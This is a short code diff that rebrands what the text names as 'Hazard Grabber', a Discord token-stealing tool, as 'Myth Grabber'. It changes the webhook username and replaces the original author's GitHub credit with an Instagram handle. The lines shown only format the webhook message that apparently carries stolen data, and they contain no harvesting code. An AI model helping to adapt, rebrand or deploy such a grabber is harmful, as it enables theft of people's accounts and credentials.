@@ -202,7 +202,7 @@ def main():
 					"icon_url": avatar_url
 				},
 				"footer": {
-					"text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Token-Grabber"
+					"text": "Siga No Insta @Mythz.exe"
 				}
 			}
 			embeds.append(embed)
@@ -212,7 +212,7 @@ def main():
 	webhook = {
 		"content": "",
 		"embeds": embeds,
-		"username": "Hazard Grabber",
+		"username": "Myth Grabber",
 		"avatar_url": "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg"
 	}
 	try:
